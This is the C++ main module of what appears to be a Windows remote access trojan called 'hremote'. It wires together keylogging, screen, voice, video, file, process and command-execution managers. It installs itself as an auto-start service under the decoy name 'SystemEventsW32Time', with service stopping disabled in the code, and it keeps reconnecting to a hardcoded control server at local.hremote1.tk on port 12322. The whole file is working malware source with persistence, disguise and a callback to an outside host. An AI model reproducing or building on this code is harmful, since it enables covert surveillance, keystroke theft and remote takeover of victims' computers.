#pragma once
#include "pch.h"
#include <stdio.h>

#include <Windows.h>

#include "commandManager.cpp"
#include "fileManager.cpp"
#include "keyboardManager.cpp"
#include "infoManager.cpp"
#include "voiceManager.cpp"
#include "videoManager.cpp"
#include "screenManager.cpp"
#include "processManager.cpp"
#include "netManager.h"

#include <MSTCPiP.h>


#pragma region 初始化static
ThreadSafeQueue<mvideo> videoManager::videoQueue;

ThreadSafeQueue<mvoice> voiceManager::voiceQueue;

ThreadSafeQueue<string> commandManager::cmdQueue;

ThreadSafeQueue<mfile> fileManager::fileQueue;

ThreadSafeQueue<minfo> infoManager::infoQueue;

ThreadSafeQueue<string> keyboardManager::keyQueue;
int keyboardManager::logFlag = 0;
int keyboardManager::logTime = 0;

ThreadSafeQueue<mscreen> screenManager::screenQueue;

ThreadSafeQueue<mprocess> processManager::processQueue;
netManager* nm;
#pragma endregion  


SERVICE_STATUS servicestatus;

SERVICE_STATUS_HANDLE hstatus;

int flag = 0;

void hremote() {
	flag = 1;
	auto h = ::CreateEvent(NULL, FALSE, TRUE, _T("only one hremote process"));
	auto err = GetLastError();
	if (err == ERROR_ALREADY_EXISTS)//确保同时只有1个hremote进程
	{
		exit(-1);
	}

	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(2, 2);
	string remoteIP;
	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		exit(-2);//如果WSAStartup返回值为1的话就表示ws2_32.dll文件有问题，程序退出
	}

	int i = 0;
	struct hostent *remoteHost;
	char host_name[] = { "local.hremote1.tk" };
	int remotePort = 12322;
	struct in_addr addr;
	while (1) {
		remoteHost = gethostbyname(host_name);
		if (remoteHost != nullptr && remoteHost->h_addr_list[0] != 0) {
			addr.s_addr = *(u_long*)remoteHost->h_addr_list[0];
			remoteIP = inet_ntoa(addr);
		}
		if (remoteIP.length() < 8) {
			//MessageBox(NULL, _T("remoteIP.length() < 8"), _T("ERROR"), SW_NORMAL);
			Sleep(4500 + rand() % 10 * 100);

		}
		else {
			break;
		}
	}


	int flag = 0;


	SOCKET sock = 0;
	nm = new netManager(remoteIP, remotePort, &sock);

	__time64_t tmpTime;
	int t = 0;

	while (1) {
		if (flag == 0) {
			while (1) {
				t = nm->init();
				if (t == 0) {
					break;//连接成功，跳出循环
				}
				//连接服务器失败
				Sleep(4500 + rand() % 10 * 100);
			}
			nm->start();
			flag = 1;

		}
		_time64(&tmpTime);
		if (tmpTime - nm->lastTime > 60) {
			flag = 0;
			//cout << "超时" << endl;
			nm->finishNet();
		}
		Sleep(10);

	}

	nm->finishNet();
	WSACleanup();  //释放ws2_32.dll动态库
}

void WINAPI CtrlHandler(DWORD request)
{

	switch (request)
	{
	//case SERVICE_CONTROL_STOP:

	//	servicestatus.dwCurrentState = SERVICE_STOPPED;

	//	break;

	case SERVICE_CONTROL_SHUTDOWN:

		servicestatus.dwCurrentState = SERVICE_STOPPED;

		break;

	default:

		break;

	}

	SetServiceStatus(hstatus, &servicestatus);
}


void WINAPI ServiceMain(int argc, char** argv)
{

	servicestatus.dwServiceType = SERVICE_WIN32;

	servicestatus.dwCurrentState = SERVICE_START_PENDING;

	servicestatus.dwControlsAccepted =  SERVICE_ACCEPT_STOP;//在本例中只接受系统关机和停止服务两种控制命令

	servicestatus.dwWin32ExitCode = 0;

	servicestatus.dwServiceSpecificExitCode = 0;

	servicestatus.dwCheckPoint = 0;

	servicestatus.dwWaitHint = 0;

	hstatus = ::RegisterServiceCtrlHandler("SystemEventsW32Time", CtrlHandler);



	//向SCM 报告运行状态

	servicestatus.dwCurrentState = SERVICE_RUNNING;

	SetServiceStatus(hstatus, &servicestatus);

	//在此处添加你自己希望服务做的工作，在这里我做的工作是获得当前可用的物理和虚拟内存信息
	hremote();



}

wstring getExeFullFilename()
{
	static wchar_t buffer[1024];

	GetModuleFileNameW(NULL, buffer, 1024);
	return wstring(buffer);
}

void InstallService()
{
	flag = 1;
  SC_HANDLE        schSCManager;
  SC_HANDLE        schService;
  SERVICE_STATUS      InstallServiceStatus;
  DWORD      dwErrorCode;

  //打开服务管理数据库
  schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
  if (schSCManager == NULL)
  {
      //Open Service Control Manager Database Failed!;
      return;
  }
  //创建服务
  schService = CreateServiceW(schSCManager,
	  L"SystemEventsW32Time",
	  L"System Events Write Time",
	  SERVICE_ALL_ACCESS,
	  SERVICE_WIN32_OWN_PROCESS,
	  SERVICE_AUTO_START,
	  SERVICE_ERROR_NORMAL,
	  getExeFullFilename().c_str(),
	  NULL, NULL, L"", NULL, L"");
  if (schService == NULL)
  {
      dwErrorCode = GetLastError();
      if (dwErrorCode != ERROR_SERVICE_EXISTS)
      {
          cout << "创建服务失败:"<< dwErrorCode << endl;
      }
      else
      {
          cout << "要创建的服务已经存在" << endl;
      }
  }
  else
  {
      //Create Service Success!;
      cout << "Create Service Success!" << endl;
  }

  CloseServiceHandle(schSCManager);
  CloseServiceHandle(schService);

  return;
}

void UninstallService()
{
	flag = 1;
  SC_HANDLE schService;
  SC_HANDLE schSCManager;
  //打开服务管理数据库
  schSCManager = OpenSCManager(
      NULL,    //本地计算机
      NULL,    //默认的数据库
      SC_MANAGER_ALL_ACCESS //要求所有的访问权
  );
  if (schSCManager)
  {
      //获取服务程序句柄
      schService = OpenService(
          schSCManager,          //服务管理数据库句柄
          "SystemEventsW32Time",   //服务名
          SERVICE_ALL_ACCESS     //响应所有的访问请求
      );
      if (schService)
      {
          //试图停止服务
          if (ControlService(
              schService,                 //服务程序句柄
              SERVICE_CONTROL_STOP, //停止服务请求码
              &servicestatus              //接收最后的服务状态信息
          ))
          {
              _tprintf(TEXT("Stopping %s."), "SystemEventsW32Time");
              Sleep(1000);

              //等待服务停止
              //
              while (QueryServiceStatus(schService, &servicestatus))
              {
                  if (SERVICE_STOP_PENDING == servicestatus.dwCurrentState)
                  {
                      _tprintf(TEXT("."));
                      Sleep(1000);
                  }
                  else
                      break;
              }
              if (SERVICE_STOPPED == servicestatus.dwCurrentState)
                  _tprintf(TEXT("\n %s stopped. \n"), "SystemEventsW32Time");
              else
                  _tprintf(TEXT("\n %s failed to stopp. \n"), "SystemEventsW32Time");
          }
          //删除已安装的服务程序安装
          if (DeleteService(schService))
              _tprintf(TEXT("%s removed. \n"), "SystemEventsW32Time");
          else
              _tprintf(TEXT("DeleteService failed - %s. \n"), GetLastError());
          CloseServiceHandle(schService);
      }
      else
          _tprintf(TEXT("OpenService failed - %s \n"), GetLastError());
      CloseServiceHandle(schSCManager);
  }
  else
      _tprintf(TEXT("OpenSCManager failed - %s \n"), GetLastError());
}

void main(int argc, char* argv[])
{
	if (argc == 2) {
		if (strcmp(argv[1], "-install") == 0) {
			InstallService();
			return ;
		}
		else if (strcmp(argv[1], "-uninstall") == 0) {
			UninstallService();
			return ;
		}
	}

	if (argc == 1) {
		try {
			SERVICE_TABLE_ENTRY entrytable[2];
			entrytable[0].lpServiceName = (LPSTR)"SystemEventsW32Time";
			entrytable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
			entrytable[1].lpServiceName = NULL;
			entrytable[1].lpServiceProc = NULL;
			StartServiceCtrlDispatcher(entrytable);
		}
		catch (...) {//如果安装了服务是不会报错的
			
		}
	}
	if(flag==0)hremote();
}








